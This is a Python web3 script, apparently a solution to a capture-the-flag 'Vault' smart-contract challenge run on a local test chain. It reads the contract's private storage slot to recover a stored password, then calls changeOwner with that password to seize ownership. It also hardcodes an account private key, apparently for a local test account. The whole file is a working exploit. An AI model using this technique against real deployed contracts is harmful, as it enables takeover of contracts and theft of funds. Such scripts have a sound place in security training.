import json
from web3 import Web3
from solcx import compile_source, install_solc

ACCOUNT_ADDR="0x6B061ff310ef9ce1C921067989cf3c7cfA428A61"
ACCOUNT_PK="0x14c9f3c6ed494798525768f27684e72f4c6ddff4bb25eddb282b2282289261c7"
CONTRACT="0xA905307a042390c50D29Cc15B966CE98Ed769483"

install_solc("0.8.0")

with open("Vault1.sol", "r") as file:
    contract_source_code = file.read()

compiled_sol = compile_source(
    contract_source_code,
    output_values=["abi", "bin"],
    solc_version="0.8.0",
)

contract_id, contract_interface = compiled_sol.popitem()
abi = contract_interface["abi"]

ganache_url = "http://127.0.0.1:50005"
web3 = Web3(Web3.HTTPProvider(ganache_url))

account = web3.eth.account.from_key(ACCOUNT_PK)
contract = web3.eth.contract(address=CONTRACT, abi=contract_interface["abi"])
if web3.is_connected():
    print("Connected to Ethereum node")
else:
    print("Failed to connect")
password = web3.eth.get_storage_at(CONTRACT, 0)

print(password)
password = password.split(b'\x00')[0]
print(password)
def changeOwner(guess, value_in_ether):

        print("guess is:", guess)
        nonce = web3.eth.get_transaction_count(account.address)

        tx = contract.functions.changeOwner(guess).build_transaction({
            'chainId': 31337,
            'gas': 7000000,
            'gasPrice': web3.to_wei('1', 'gwei'),
            'nonce': nonce,
            'value': web3.to_wei(value_in_ether, 'ether')
        })

        signed_tx = web3.eth.account.sign_transaction(tx, ACCOUNT_PK)

        tx_hash = web3.eth.send_raw_transaction(signed_tx.rawTransaction)
        tx_receipt = web3.eth.wait_for_transaction_receipt(tx_hash)

        return_value = contract.functions.changeOwner(guess).call({
            'from': account.address,
            'value': web3.to_wei(value_in_ether, 'ether')
        })
        print("return value: ", return_value)
        print(f"Transaction receipt: {tx_receipt}")
changeOwner(password.decode(), 0.5)
